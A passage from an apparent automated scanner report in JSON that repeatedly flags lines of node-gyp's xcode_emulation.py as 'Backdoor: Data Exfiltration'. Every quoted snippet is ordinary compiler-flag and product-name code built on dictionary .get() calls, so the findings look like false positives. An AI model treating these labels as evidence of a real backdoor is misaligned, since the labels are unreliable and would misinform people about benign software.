                      "markdown": "`            if flag in (\"$inherited\", \"$(inherited)\", \"${inherited}\"):\n                flag = \"$OTHER_CFLAGS\"\n            if flag in (\"$OTHER_CFLAGS\", \"$(OTHER_CFLAGS)\", \"${OTHER_CFLAGS}\"):\n                other_ccflags += self._Settings().get(\"OTHER_CFLAGS\", [])\n            else:\n                other_ccflags.append(flag)\n        cflags_cc += other_ccflags\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 740,
                  "startColumn": 36,
                  "endLine": 740,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n        other_ccflags = []\n\n        for flag in self._Settings().get(\"OTHER_CPLUSPLUSFLAGS\", [\"$(inherited)\"]):\n            # TODO: More general variable expansion. Missing in many other places too.\n            if flag in (\"$inherited\", \"$(inherited)\", \"${inherited}\"):\n                flag = \"$OTHER_CFLAGS\"\n",
                    "rendered": {
                      "text": "\n        other_ccflags = []\n\n        for flag in self._Settings().get(\"OTHER_CPLUSPLUSFLAGS\", [\"$(inherited)\"]):\n            # TODO: More general variable expansion. Missing in many other places too.\n            if flag in (\"$inherited\", \"$(inherited)\", \"${inherited}\"):\n                flag = \"$OTHER_CFLAGS\"\n",
                      "markdown": "`\n        other_ccflags = []\n\n        for flag in self._Settings().get(\"OTHER_CPLUSPLUSFLAGS\", [\"$(inherited)\"]):\n            # TODO: More general variable expansion. Missing in many other places too.\n            if flag in (\"$inherited\", \"$(inherited)\", \"${inherited}\"):\n                flag = \"$OTHER_CFLAGS\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 716,
                  "startColumn": 54,
                  "endLine": 716,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        self.configname = configname\n        cflags_cc = []\n\n        clang_cxx_language_standard = self._Settings().get(\n            \"CLANG_CXX_LANGUAGE_STANDARD\"\n        )\n        # Note: Don't make c++0x to c++11 so that c++0x can be used with older\n",
                    "rendered": {
                      "text": "        self.configname = configname\n        cflags_cc = []\n\n        clang_cxx_language_standard = self._Settings().get(\n            \"CLANG_CXX_LANGUAGE_STANDARD\"\n        )\n        # Note: Don't make c++0x to c++11 so that c++0x can be used with older\n",
                      "markdown": "`        self.configname = configname\n        cflags_cc = []\n\n        clang_cxx_language_standard = self._Settings().get(\n            \"CLANG_CXX_LANGUAGE_STANDARD\"\n        )\n        # Note: Don't make c++0x to c++11 so that c++0x can be used with older\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 707,
                  "startColumn": 36,
                  "endLine": 707,
                  "endColumn": 41,
                  "snippet": {
                    "text": "            cflags_c.append(\"-ansi\")\n        else:\n            self._Appendf(cflags_c, \"GCC_C_LANGUAGE_STANDARD\", \"-std=%s\")\n        cflags_c += self._Settings().get(\"OTHER_CFLAGS\", [])\n        self.configname = None\n        return cflags_c\n\n",
                    "rendered": {
                      "text": "            cflags_c.append(\"-ansi\")\n        else:\n            self._Appendf(cflags_c, \"GCC_C_LANGUAGE_STANDARD\", \"-std=%s\")\n        cflags_c += self._Settings().get(\"OTHER_CFLAGS\", [])\n        self.configname = None\n        return cflags_c\n\n",
                      "markdown": "`            cflags_c.append(\"-ansi\")\n        else:\n            self._Appendf(cflags_c, \"GCC_C_LANGUAGE_STANDARD\", \"-std=%s\")\n        cflags_c += self._Settings().get(\"OTHER_CFLAGS\", [])\n        self.configname = None\n        return cflags_c\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 703,
                  "startColumn": 27,
                  "endLine": 703,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        \"\"\"Returns flags that need to be added to .c, and .m compilations.\"\"\"\n        self.configname = configname\n        cflags_c = []\n        if self._Settings().get(\"GCC_C_LANGUAGE_STANDARD\", \"\") == \"ansi\":\n            cflags_c.append(\"-ansi\")\n        else:\n            self._Appendf(cflags_c, \"GCC_C_LANGUAGE_STANDARD\", \"-std=%s\")\n",
                    "rendered": {
                      "text": "        \"\"\"Returns flags that need to be added to .c, and .m compilations.\"\"\"\n        self.configname = configname\n        cflags_c = []\n        if self._Settings().get(\"GCC_C_LANGUAGE_STANDARD\", \"\") == \"ansi\":\n            cflags_c.append(\"-ansi\")\n        else:\n            self._Appendf(cflags_c, \"GCC_C_LANGUAGE_STANDARD\", \"-std=%s\")\n",
                      "markdown": "`        \"\"\"Returns flags that need to be added to .c, and .m compilations.\"\"\"\n        self.configname = configname\n        cflags_c = []\n        if self._Settings().get(\"GCC_C_LANGUAGE_STANDARD\", \"\") == \"ansi\":\n            cflags_c.append(\"-ansi\")\n        else:\n            self._Appendf(cflags_c, \"GCC_C_LANGUAGE_STANDARD\", \"-std=%s\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 692,
                  "startColumn": 31,
                  "endLine": 692,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\n        framework_root = sdk_root if sdk_root else \"\"\n        config = self.spec[\"configurations\"][self.configname]\n        framework_dirs = config.get(\"mac_framework_dirs\", [])\n        for directory in framework_dirs:\n            cflags.append(\"-F\" + directory.replace(\"$(SDKROOT)\", framework_root))\n\n",
                    "rendered": {
                      "text": "\n        framework_root = sdk_root if sdk_root else \"\"\n        config = self.spec[\"configurations\"][self.configname]\n        framework_dirs = config.get(\"mac_framework_dirs\", [])\n        for directory in framework_dirs:\n            cflags.append(\"-F\" + directory.replace(\"$(SDKROOT)\", framework_root))\n\n",
                      "markdown": "`\n        framework_root = sdk_root if sdk_root else \"\"\n        config = self.spec[\"configurations\"][self.configname]\n        framework_dirs = config.get(\"mac_framework_dirs\", [])\n        for directory in framework_dirs:\n            cflags.append(\"-F\" + directory.replace(\"$(SDKROOT)\", framework_root))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 683,
                  "startColumn": 34,
                  "endLine": 683,
                  "endColumn": 39,
                  "snippet": {
                    "text": "                if self._Test(\"GCC_ENABLE_SSE42_EXTENSIONS\", \"YES\", default=\"NO\"):\n                    cflags.append(\"-msse4.2\")\n\n        cflags += self._Settings().get(\"WARNING_CFLAGS\", [])\n\n        if self._IsXCTest():\n            platform_root = self._XcodePlatformPath(configname)\n",
                    "rendered": {
                      "text": "                if self._Test(\"GCC_ENABLE_SSE42_EXTENSIONS\", \"YES\", default=\"NO\"):\n                    cflags.append(\"-msse4.2\")\n\n        cflags += self._Settings().get(\"WARNING_CFLAGS\", [])\n\n        if self._IsXCTest():\n            platform_root = self._XcodePlatformPath(configname)\n",
                      "markdown": "`                if self._Test(\"GCC_ENABLE_SSE42_EXTENSIONS\", \"YES\", default=\"NO\"):\n                    cflags.append(\"-msse4.2\")\n\n        cflags += self._Settings().get(\"WARNING_CFLAGS\", [])\n\n        if self._IsXCTest():\n            platform_root = self._XcodePlatformPath(configname)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 624,
                  "startColumn": 29,
                  "endLine": 624,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\n        if self._Settings().get(\"GCC_STRICT_ALIASING\") == \"YES\":\n            cflags.append(\"-fstrict-aliasing\")\n        elif self._Settings().get(\"GCC_STRICT_ALIASING\") == \"NO\":\n            cflags.append(\"-fno-strict-aliasing\")\n\n        if self._Test(\"GCC_SYMBOLS_PRIVATE_EXTERN\", \"YES\", default=\"NO\"):\n",
                    "rendered": {
                      "text": "\n        if self._Settings().get(\"GCC_STRICT_ALIASING\") == \"YES\":\n            cflags.append(\"-fstrict-aliasing\")\n        elif self._Settings().get(\"GCC_STRICT_ALIASING\") == \"NO\":\n            cflags.append(\"-fno-strict-aliasing\")\n\n        if self._Test(\"GCC_SYMBOLS_PRIVATE_EXTERN\", \"YES\", default=\"NO\"):\n",
                      "markdown": "`\n        if self._Settings().get(\"GCC_STRICT_ALIASING\") == \"YES\":\n            cflags.append(\"-fstrict-aliasing\")\n        elif self._Settings().get(\"GCC_STRICT_ALIASING\") == \"NO\":\n            cflags.append(\"-fno-strict-aliasing\")\n\n        if self._Test(\"GCC_SYMBOLS_PRIVATE_EXTERN\", \"YES\", default=\"NO\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 622,
                  "startColumn": 27,
                  "endLine": 622,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            else:\n                raise NotImplementedError(\"Unknown debug format %s\" % dbg_format)\n\n        if self._Settings().get(\"GCC_STRICT_ALIASING\") == \"YES\":\n            cflags.append(\"-fstrict-aliasing\")\n        elif self._Settings().get(\"GCC_STRICT_ALIASING\") == \"NO\":\n            cflags.append(\"-fno-strict-aliasing\")\n",
                    "rendered": {
                      "text": "            else:\n                raise NotImplementedError(\"Unknown debug format %s\" % dbg_format)\n\n        if self._Settings().get(\"GCC_STRICT_ALIASING\") == \"YES\":\n            cflags.append(\"-fstrict-aliasing\")\n        elif self._Settings().get(\"GCC_STRICT_ALIASING\") == \"NO\":\n            cflags.append(\"-fno-strict-aliasing\")\n",
                      "markdown": "`            else:\n                raise NotImplementedError(\"Unknown debug format %s\" % dbg_format)\n\n        if self._Settings().get(\"GCC_STRICT_ALIASING\") == \"YES\":\n            cflags.append(\"-fstrict-aliasing\")\n        elif self._Settings().get(\"GCC_STRICT_ALIASING\") == \"NO\":\n            cflags.append(\"-fno-strict-aliasing\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 612,
                  "startColumn": 41,
                  "endLine": 612,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        self._Appendf(cflags, \"GCC_OPTIMIZATION_LEVEL\", \"-O%s\", default=\"s\")\n\n        if self._Test(\"GCC_GENERATE_DEBUGGING_SYMBOLS\", \"YES\", default=\"YES\"):\n            dbg_format = self._Settings().get(\"DEBUG_INFORMATION_FORMAT\", \"dwarf\")\n            if dbg_format == \"dwarf\":\n                cflags.append(\"-gdwarf-2\")\n            elif dbg_format == \"stabs\":\n",
                    "rendered": {
                      "text": "        self._Appendf(cflags, \"GCC_OPTIMIZATION_LEVEL\", \"-O%s\", default=\"s\")\n\n        if self._Test(\"GCC_GENERATE_DEBUGGING_SYMBOLS\", \"YES\", default=\"YES\"):\n            dbg_format = self._Settings().get(\"DEBUG_INFORMATION_FORMAT\", \"dwarf\")\n            if dbg_format == \"dwarf\":\n                cflags.append(\"-gdwarf-2\")\n            elif dbg_format == \"stabs\":\n",
                      "markdown": "`        self._Appendf(cflags, \"GCC_OPTIMIZATION_LEVEL\", \"-O%s\", default=\"s\")\n\n        if self._Test(\"GCC_GENERATE_DEBUGGING_SYMBOLS\", \"YES\", default=\"YES\"):\n            dbg_format = self._Settings().get(\"DEBUG_INFORMATION_FORMAT\", \"dwarf\")\n            if dbg_format == \"dwarf\":\n                cflags.append(\"-gdwarf-2\")\n            elif dbg_format == \"stabs\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 516,
                  "startColumn": 27,
                  "endLine": 516,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        return xcode_archs_default.ActiveArchs(\n            config_settings.get(\"ARCHS\"),\n            config_settings.get(\"VALID_ARCHS\"),\n            config_settings.get(\"SDKROOT\"),\n        )\n\n    def _GetSdkVersionInfoItem(self, sdk, infoitem):\n",
                    "rendered": {
                      "text": "        return xcode_archs_default.ActiveArchs(\n            config_settings.get(\"ARCHS\"),\n            config_settings.get(\"VALID_ARCHS\"),\n            config_settings.get(\"SDKROOT\"),\n        )\n\n    def _GetSdkVersionInfoItem(self, sdk, infoitem):\n",
                      "markdown": "`        return xcode_archs_default.ActiveArchs(\n            config_settings.get(\"ARCHS\"),\n            config_settings.get(\"VALID_ARCHS\"),\n            config_settings.get(\"SDKROOT\"),\n        )\n\n    def _GetSdkVersionInfoItem(self, sdk, infoitem):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 515,
                  "startColumn": 27,
                  "endLine": 515,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        xcode_archs_default = GetXcodeArchsDefault()\n        return xcode_archs_default.ActiveArchs(\n            config_settings.get(\"ARCHS\"),\n            config_settings.get(\"VALID_ARCHS\"),\n            config_settings.get(\"SDKROOT\"),\n        )\n\n",
                    "rendered": {
                      "text": "        xcode_archs_default = GetXcodeArchsDefault()\n        return xcode_archs_default.ActiveArchs(\n            config_settings.get(\"ARCHS\"),\n            config_settings.get(\"VALID_ARCHS\"),\n            config_settings.get(\"SDKROOT\"),\n        )\n\n",
                      "markdown": "`        xcode_archs_default = GetXcodeArchsDefault()\n        return xcode_archs_default.ActiveArchs(\n            config_settings.get(\"ARCHS\"),\n            config_settings.get(\"VALID_ARCHS\"),\n            config_settings.get(\"SDKROOT\"),\n        )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 514,
                  "startColumn": 27,
                  "endLine": 514,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        config_settings = self.xcode_settings[configname]\n        xcode_archs_default = GetXcodeArchsDefault()\n        return xcode_archs_default.ActiveArchs(\n            config_settings.get(\"ARCHS\"),\n            config_settings.get(\"VALID_ARCHS\"),\n            config_settings.get(\"SDKROOT\"),\n        )\n",
                    "rendered": {
                      "text": "        config_settings = self.xcode_settings[configname]\n        xcode_archs_default = GetXcodeArchsDefault()\n        return xcode_archs_default.ActiveArchs(\n            config_settings.get(\"ARCHS\"),\n            config_settings.get(\"VALID_ARCHS\"),\n            config_settings.get(\"SDKROOT\"),\n        )\n",
                      "markdown": "`        config_settings = self.xcode_settings[configname]\n        xcode_archs_default = GetXcodeArchsDefault()\n        return xcode_archs_default.ActiveArchs(\n            config_settings.get(\"ARCHS\"),\n            config_settings.get(\"VALID_ARCHS\"),\n            config_settings.get(\"SDKROOT\"),\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 497,
                  "startColumn": 28,
                  "endLine": 497,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        \"\"\"Returns the executable name of the bundle represented by this target.\n    E.g. Chromium.\"\"\"\n        if self._IsBundle():\n            return self.spec.get(\"product_name\", self.spec[\"target_name\"])\n        else:\n            return self._GetStandaloneBinaryPath()\n\n",
                    "rendered": {
                      "text": "        \"\"\"Returns the executable name of the bundle represented by this target.\n    E.g. Chromium.\"\"\"\n        if self._IsBundle():\n            return self.spec.get(\"product_name\", self.spec[\"target_name\"])\n        else:\n            return self._GetStandaloneBinaryPath()\n\n",
                      "markdown": "`        \"\"\"Returns the executable name of the bundle represented by this target.\n    E.g. Chromium.\"\"\"\n        if self._IsBundle():\n            return self.spec.get(\"product_name\", self.spec[\"target_name\"])\n        else:\n            return self._GetStandaloneBinaryPath()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 489,
                  "startColumn": 26,
                  "endLine": 489,
                  "endColumn": 31,
                  "snippet": {
                    "text": "                target = target[3:]\n\n        target_prefix = self._GetStandaloneExecutablePrefix()\n        target = self.spec.get(\"product_name\", target)\n        target_ext = self._GetStandaloneExecutableSuffix()\n        return target_prefix + target + target_ext\n\n",
                    "rendered": {
                      "text": "                target = target[3:]\n\n        target_prefix = self._GetStandaloneExecutablePrefix()\n        target = self.spec.get(\"product_name\", target)\n        target_ext = self._GetStandaloneExecutableSuffix()\n        return target_prefix + target + target_ext\n\n",
                      "markdown": "`                target = target[3:]\n\n        target_prefix = self._GetStandaloneExecutablePrefix()\n        target = self.spec.get(\"product_name\", target)\n        target_ext = self._GetStandaloneExecutableSuffix()\n        return target_prefix + target + target_ext\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 458,
                  "startColumn": 24,
                  "endLine": 458,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        }[self.spec[\"type\"]]\n\n    def _GetStandaloneExecutablePrefix(self):\n        return self.spec.get(\n            \"product_prefix\",\n            {\n                \"executable\": \"\",\n",
                    "rendered": {
                      "text": "        }[self.spec[\"type\"]]\n\n    def _GetStandaloneExecutablePrefix(self):\n        return self.spec.get(\n            \"product_prefix\",\n            {\n                \"executable\": \"\",\n",
                      "markdown": "`        }[self.spec[\"type\"]]\n\n    def _GetStandaloneExecutablePrefix(self):\n        return self.spec.get(\n            \"product_prefix\",\n            {\n                \"executable\": \"\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 288,
                  "startColumn": 24,
                  "endLine": 288,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    def GetProductName(self):\n        \"\"\"Returns PRODUCT_NAME.\"\"\"\n        return self.spec.get(\"product_name\", self.spec[\"target_name\"])\n\n    def GetFullProductName(self):\n        \"\"\"Returns FULL_PRODUCT_NAME.\"\"\"\n",
                    "rendered": {
                      "text": "\n    def GetProductName(self):\n        \"\"\"Returns PRODUCT_NAME.\"\"\"\n        return self.spec.get(\"product_name\", self.spec[\"target_name\"])\n\n    def GetFullProductName(self):\n        \"\"\"Returns FULL_PRODUCT_NAME.\"\"\"\n",
                      "markdown": "`\n    def GetProductName(self):\n        \"\"\"Returns PRODUCT_NAME.\"\"\"\n        return self.spec.get(\"product_name\", self.spec[\"target_name\"])\n\n    def GetFullProductName(self):\n        \"\"\"Returns FULL_PRODUCT_NAME.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 279,
                  "startColumn": 38,
                  "endLine": 279,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            if self._IsIosAppExtension() or self._IsIosWatchKitExtension():\n                return \".\" + self.spec.get(\"product_extension\", \"appex\")\n            else:\n                return \".\" + self.spec.get(\"product_extension\", \"app\")\n        else:\n            assert False, \"Don't know extension for '{}', target '{}'\".format(\n                self.spec[\"type\"],\n",
                    "rendered": {
                      "text": "            if self._IsIosAppExtension() or self._IsIosWatchKitExtension():\n                return \".\" + self.spec.get(\"product_extension\", \"appex\")\n            else:\n                return \".\" + self.spec.get(\"product_extension\", \"app\")\n        else:\n            assert False, \"Don't know extension for '{}', target '{}'\".format(\n                self.spec[\"type\"],\n",
                      "markdown": "`            if self._IsIosAppExtension() or self._IsIosWatchKitExtension():\n                return \".\" + self.spec.get(\"product_extension\", \"appex\")\n            else:\n                return \".\" + self.spec.get(\"product_extension\", \"app\")\n        else:\n            assert False, \"Don't know extension for '{}', target '{}'\".format(\n                self.spec[\"type\"],\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 277,
                  "startColumn": 38,
                  "endLine": 277,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            return \".\" + self.spec.get(\"product_extension\", wrapper_extension)\n        elif self.spec[\"type\"] == \"executable\":\n            if self._IsIosAppExtension() or self._IsIosWatchKitExtension():\n                return \".\" + self.spec.get(\"product_extension\", \"appex\")\n            else:\n                return \".\" + self.spec.get(\"product_extension\", \"app\")\n        else:\n",
                    "rendered": {
                      "text": "            return \".\" + self.spec.get(\"product_extension\", wrapper_extension)\n        elif self.spec[\"type\"] == \"executable\":\n            if self._IsIosAppExtension() or self._IsIosWatchKitExtension():\n                return \".\" + self.spec.get(\"product_extension\", \"appex\")\n            else:\n                return \".\" + self.spec.get(\"product_extension\", \"app\")\n        else:\n",
                      "markdown": "`            return \".\" + self.spec.get(\"product_extension\", wrapper_extension)\n        elif self.spec[\"type\"] == \"executable\":\n            if self._IsIosAppExtension() or self._IsIosWatchKitExtension():\n                return \".\" + self.spec.get(\"product_extension\", \"appex\")\n            else:\n                return \".\" + self.spec.get(\"product_extension\", \"app\")\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 274,
                  "startColumn": 34,
                  "endLine": 274,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            wrapper_extension = self.GetPerTargetSetting(\n                \"WRAPPER_EXTENSION\", default=default_wrapper_extension\n            )\n            return \".\" + self.spec.get(\"product_extension\", wrapper_extension)\n        elif self.spec[\"type\"] == \"executable\":\n            if self._IsIosAppExtension() or self._IsIosWatchKitExtension():\n                return \".\" + self.spec.get(\"product_extension\", \"appex\")\n",
                    "rendered": {
                      "text": "            wrapper_extension = self.GetPerTargetSetting(\n                \"WRAPPER_EXTENSION\", default=default_wrapper_extension\n            )\n            return \".\" + self.spec.get(\"product_extension\", wrapper_extension)\n        elif self.spec[\"type\"] == \"executable\":\n            if self._IsIosAppExtension() or self._IsIosWatchKitExtension():\n                return \".\" + self.spec.get(\"product_extension\", \"appex\")\n",
                      "markdown": "`            wrapper_extension = self.GetPerTargetSetting(\n                \"WRAPPER_EXTENSION\", default=default_wrapper_extension\n            )\n            return \".\" + self.spec.get(\"product_extension\", wrapper_extension)\n        elif self.spec[\"type\"] == \"executable\":\n            if self._IsIosAppExtension() or self._IsIosWatchKitExtension():\n                return \".\" + self.spec.get(\"product_extension\", \"appex\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 254,
                  "startColumn": 28,
                  "endLine": 254,
                  "endColumn": 33,
                  "snippet": {
